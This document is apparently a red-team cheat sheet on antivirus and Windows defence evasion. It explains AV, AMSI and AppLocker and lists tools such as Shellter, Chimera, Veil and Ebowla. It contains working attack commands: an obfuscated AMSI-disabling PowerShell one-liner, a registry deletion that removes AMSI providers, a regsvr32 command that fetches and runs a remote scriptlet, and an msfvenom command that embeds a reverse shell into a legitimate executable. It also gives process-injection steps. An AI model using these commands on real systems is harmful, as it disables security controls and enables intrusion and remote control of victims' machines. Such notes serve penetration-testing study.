AV Evasion:
==========
Basics:
	Note:
		Read Malware Basics Sheet for basics of malware.
	Confusion between AV Evasion & MalDev:
		MalDev and AV Evasion go hand in hand and are two sides of same coin.
		MalDev is about creating the raw malware either by writing its whole code with hand, or using a tool like msfvenom. 
		Malware may not exploit in presence of EDR or AV. So, for that special techniques/tools are used to bypass the AV.
		Note:
			Read Malware Development Sheet to read about MalDev.
	Real-World Malware Defense Systems:
		Types:(2)
			A. Additional Systems:
				Types:(2)
					1. Additional Defense Mechanisms:(Software)
						A. Anti-Virus:
							Basics:
							Types:(3)
								1. Signature Based:
									An antivirus signature is a continuous sequence of bytes within malware that uniquely identifies it.
									If the signature of a file is matched against the blacklisted signatures list, AV alert is triggered and the malware is qurantined.
									Bypass:
										Changing or obfuscating the contents of a known malicious file in order to change the signature
								2. Heuristic Based:(Mordern Approach)
									This method relies on rules and algorithms to determine if the code contains certain set of code or instructions or executable segments which do some malicious action when executed.
									The idea is to look for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.		
								3. Behavior Based:
									AV dynamically analyzes the behavior of a binary file.
									This is achieved by executing the file in question in an emulated environment, such as a small virtual machine, and looking for behaviors or actions that are considered malicious.				
						B. Anti-Exploit:(aka Next-gen AV)
						C. EDR:(Endpoint Detetction & Response System)
						D. Application Whitelisting:
						E. Additional Firewall:
					2. Defenders:(Defense Personell)
						Threat Hunting Teams:
						Blue Team:
			B. In-Built Defense Mechanisms:
				AV Mechanism:
					Windows Defender AV:
					AMSI:(Anti Malware Scan Interface)
						Basics:
							AMSI is a set of Windows APIs that allows any application to integrate with an antivirus product to defend against common malware execution(execution not storage?) which was First introduced in Windows 10.
								Windows Defender, naturally, acts as an AMSI provider as do many third-party AV solutions.
							By default Windows Defender interacts with the AMSI API to scan:
								Powershell commands and scripts
								VBA macros
								JavaScript
								VBScript
								Windows Script Host (wscript.exe and cscript.exe)
								EXE
								MSI
								AcitveX
								COM
						Working:
							When a user executes a script or initiates PowerShell, the amsi.dll is injected into the process memory space.
							Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware:
								1. AmsiScanBuffer()
								2. AmsiScanString()
				Windows Browser Protection Mechanisms:
					Windows Defender Smartscreen:
				WDAC:(Windows Defender Application Control)
				Windows Firewall:
				Windows Credential Protection Mechanisms:
					Credential Guard:
				Windows Hardening:
					PS & CMD:
						Windows Applocker:
							Basics:
								Applocker blocks execution of scripts in CMD and PS
						Powershell Tweaking:
							Constrained Language Mode:
							Powershell v5 only (v2.0 disabled)
							Centralized logging with full transcript mode
				Windows Boot Defense Mechanisms:
					UEFI:(Unified Extensible Firmware Interface)
					Secure Boot:
				Windows Memory Protection Mechanisms:
					DEP:
					SEHOP:
					ASLR:
	AV Evasion:
		AV Evasion, in broader terms, refer to bypassing these "Real-World Malware Defense Systems" to make an un-exploitable malware "exploitable".
		AV Evasion Methods:
			1. On-Disk Evasion:
				Basics:
					Modifying Payload to physically store it on victim disk.
					Important in Persistence
				Types:
					1. Packers:
						They reduce the size of executable and make a completely new binary structure for the file on disk.
					2. Obfuscators:
						They are used to hide the malicious code into legitimate code of process by reorganizing and changing code by adding dead code and changing the semantics of existing instructions with equally but malicious code instructions, so that it becomes nearly impossible to reverse engineer it for the AV.
					3. Cryptors:
						They cryptographically change the code of payload and make a decryption function or subprocess known as STUB which is then hidden.
						The decryption of encrypted code works on memory, and decrypted executable code is left on disk. Therefore AV can not remove it before execution.
					4. Protectors:
						The Protectors were actually made by software companies to prevent anyone from reversing, debugging, testing their code on virtual machine emulation process.
						Protectors can be used with payload to stop AV from reversing the payload.
			2. In-Memory Evasion:(aka In-Memory Injection)(aka PE Injection)
				This method focues on manipulating the volatile memory
				Types:
					1. Remote Process Memory Injection:(Very Common)
						In this method, we abuse HANDLES using WinAPI:
							if there is a running process you wanna control:
								Use function OpenProcess() to open the process
								Then use VitualAllocEx() function to allocate memory to it
								Then use function WriteProcessMemory() to write to the executing process
								Then gain HANDLE using GetModuleHandle()
								Then get the address of process using GetProcessAddress()
								Once you have got address and HANDLE, you can create your own thread using CreateRemoteThread().
								Once you create Remote thread in memory, it will be automatically loaded and executed.
					2. Inline Function Hooking:(aka Inline Hooking)
						In this method, we add a hook to a function running in memory to change the course of flow of execution to our payload.
						Once, the payload is executed, flow of execution is returned to the orginal function.
					3. Process Hallowing:(aka Process Hollowing)
						In this method, we start a non-malicious process in suspended state. Once the process is started,  we replace image of process with a malicious executable image.
						Then, we resume the process and malicious code is executed.
						How do AV detect process hallowing:
							Detecting parent chold process relationship
					4. Reflective DLL Injection:
						Read DLL Exploitation Sheet
		AV Evasion Approach:
			A. Traditional Approach:(Useless now)
				Features:
					Using CMD
					On-Disk Approach:
						Uploading binaries like Executables, MSI, etc.
						Uploading scripts like VBScripts, Batch Scripts, etc.
				Issues in Traditional Approach:
					Storing tools on disk leads to increased detection risk
					VBScript and Batch scripts are flagged by AV as they need to be written on disk
					Common tools like mimikatz.exe/nc.exe are caught by AV because of their signature.
			B. Mordern Approach:(aka Minimalist Approach)(aka Living Off The Land Approach)
				Basics:
					It is done to avoid detection by not writing anything to a disk.
					"Why increase risk of detection by using more tools", so we use tools available in windows by default.
				Features:
					Using WMIC
					Using In-Built Commands and Utilities:
						Examples:
							netsh => using it for pivoting instead of uploading some binary for pivoting.
					Using LOLBAS:(https://lolbas-project.github.io/)
						aka Living Off The Land Binaries and Scripts
						Basics:
							A LOL Bin/Lib/Script must follow the following criteria:
								1. Microsoft Signed
								2. Have extra “unexpected” functionality
								3. Have functionality that would be useful to an APT or red team
						Examples:
							regsvr32.exe:
								Basics:
									Third most popular ATT&CK technique
								Exploitation:
									Bypassing Application Whitelisting:
										Requirements:
											malc.sct:
												Using Empire:
													usestager windows/launcher_sct
													Note:
														To read more about Empire => Read Red-Teaming Sheet
										Exploit:
											CMD> regsvr32 /s /n /u /i:https://example.com/malc.sct scrobj.dll
												Flags:
													/s => silent
													/n => dont call DLL register service
													/i => ip or website
													/u => use unregister method
							rundll32.exe:
								Basics:
								Exploitation:
									Executing payload/scripts:
					Using Powershell instead of CMD:
						Why Powershell is a better option for Evasion?
							1. Allowed use of one-liners and scripts
							2. Inbuilt Obsfucation:
								powershell -e
							3. PS gives access to .NET Framework (aka Native Execution)
							4. Scripts runs in memory
							5. Ability to interact with WinAPI
					Using ps1 scripts instead of vbscripts and batch scripts
				Advantages:
					This approach leads to decreased risk of detection because of the following reasons:
						1. In-Memory Approach of powershell
						2. Using in-built commands and utilities instead of uploading tools
						3. Better MalDev because of Inbuilt Obsfucation, Native Execution support and ability to interact with WinAPI provided by powershell.
	Real-Life AV Evasion Overview:
		1. Using Mordern AV Evasion Approach:
			Explained Above
		2. Encryption, Obsfucation and Weaponization:
			Read Social Engineering and Client Side Attacks Sheet
Windows Defender Evasion:
	Editing Payload:
		Finding the malicious bit:
			DefenderCheck:(https://github.com/matterpreter/DefenderCheck)
				This tool takes a binary as an input and divides it into many parts and test each against windows defender and finds which bit is triggering detection
				Usage:
					.\defendercheck.exe malc.exe
		Re-writing the malicious bit:
AMSI Evasion:
	Basics: Read above
	Evasion:
		In Powershell:
			1. PowerShell Downgrade:(Changing PS version)
				Older versions of PowerShell doesn’t contain security controls such as AMSI protection and could be utilized as a form of evasion. 
				To see current powershell version:
					PS>$psversiontable
				To change Powershell version:
					CMD> powershell -version 2.0
					CMD> powershell -version 2
					PS> powershell -version 2.0
					PS> powershell -version 2
			2. Base64 Encoding to change AMSI settings:
				Explanation:
					This technique prevents AMSI scanning capability for the current process by setting the “amsiInitFailed” flag.
				First, run this:
					PS> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
				Now, we can execute anyything we wanna execute
			3. Hooking:
				We INJECT Amsihook.dll which evades AMSI by hooking into the “AmsiScanBuffer” function. The “AmsiScanBuffer” will then be executed with dummy parameters.
			4. Registry Key Modification:
				We remove AMSI
				PS>Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
APPLOCKER Bypass:
	Basics: Read above
	Explotiation:
		https://github.com/api0cradle/UltimateAppLockerByPassList
Backdooring:
	MSFVenom:
		Embedding payload into some executable:
			msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x plink.exe -k -o embedded.exe
			Flags:
				-x or –template => it is used to an executable as a template when creating Payload.
				-k, or –keep => preserve the template’s normal behaviour
		Note:
			To read more about MSFVenom, see Exploitation sheet	
	Shellter:(apt-get install shellter wine)
		Shellter is a dynamic shellcode injection tool used to backdoor into native Windows applications(32-bit only) by injecting shellcode
		Usage:
			First, set the operation mode:
				It has two operation modes:
					Automatic:
						In Automatic mode, we use Shelter "ready to use payload"
					Manual:
						In Manual mode, we need to provide our payload (generated earlier from some C2 or msf)
			Then, select the target PE:
				Target PE => application which we wanna backdoor.
			Then, select "enable stealth mode":
				Stealth Mode:
					This mode attempts to restore the execution flow of the PE after our payload has been executed
			Then, select the payload type(if Automatic mode) or Enter Payload(if Manual mode)
Evading Shellcode Detection:
	UniByAv:(https://github.com/Mr-Un1k0d3r/UniByAv)
		UniByAv is a simple obfuscator that take raw shellcode and generate executable that are Anti-Virus friendly.
		Installation:
			git clone https://github.com/Mr-Un1k0d3r/UniByAv.git
			apt install mingw-w64 wine
		Usage:
Evading Powershell script Detection:
	Chimera:
		Chimera is a PowerShell obfuscation script designed to bypass AMSIs.
		It digests malicious PS1's known to trigger AV and uses string substitution and variable concatenation to evade common detection signatures.
		Installation:
			sudo apt-get update && sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git
			sudo git clone https://github.com/tokyoneon/chimera /opt/chimera
			sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/
			sudo chmod +x chimera.sh;
			./chimera.sh
		Usage:
			Flags:
				-l => to increase the degree/level of obfuscation
					1
					2
					3
					4
				-v => substitute variable names with random strings
				-v worslist.txt => Detected variables like $encoding and $writer are substituted with random strings from the provided wordlist
				-t => substitute data types
				-j => substitute function names
				-c => replace comments with arbitary data
				-i => insert arbitary comments into every line
				-h => convert attackers ip to hex
				-d => Converts the payload to decimal format, it usually increases the likeliness of evading AMSI
				-r => will randomize the character punctuations and is automatically applied with -d
				-f shell.ps1
				-o out.ps1
				-e => Examine the obfuscated file when the process is complete
Evading Python script Detection:;	
	PyObfx:
		Python Obfuscation tool
		Installation:(https://github.com/PyObfx/PyObfx)
			git clone https://github.com/PyObfx/PyObfx.git && cd PyObfx/
			pip install -r requirements.txt	
		Usage:
			Flags:
				-f => file to be obfuscated
				-p <pack> => To pack the file after obfuscation
					Available packers:
						bz2
						gz
						lzma
				-o out.shell
Multi:
	Ebowla:(https://github.com/Genetic-Malware/Ebowla)
		Basics:
		Usage:
			Edit genetic.config:
				output_type = GO
				payload_type = EXE
					Optional:
						computername = '<hostname>'
						userdomain = ''
			./ebowla.py malc.exe genetic.config => this will create a file in /output folder
			/build_x64_go.sh output/filename.ext output.exe => this will create output.exe in /output folder
				Note:
					Do not add a path before before output.exe, that will raise an error
	Veil-Evasion:(apt-get install veil)
		Basics:
			It has two Parts:
				Evasion => AV Evasion
				Ordance => Shellcode Generation	
			Note:
				only for msf
		Usage:
			Evasion:
				it has a lot of .py payloads for powershell/python/ruby/go/perl
				Naming of Payloads:
					payload_language/shell_type/payload_obfuscation
					shell_type:
						Meterpreter
						Shellcode Inject:
							They are designed to load shellcode into memory and execute it. These payloads give you the ability to write your own custom shellcode and run it. You can use these payloads to automatically create a user account on the system, spawn calc.exe, or anything you want via the shellcode you write or use.
							We can generate the shellcode via msfvenom or Ordance
				which language payload to chose?
					Lower-Level Language => the better AV evasion
						C>Golang
					Higher-Level Language:
						Ruby/Python/Powershell/Perl
				Chose the payload
				choose LHOST/LPORT
				it will create 3 files:
					payload.exe => executable payload
					payload.rc => metasploit file
					payload.c => source code
			Ordance:
				Used to generate shellcode for shellcode_inject payloads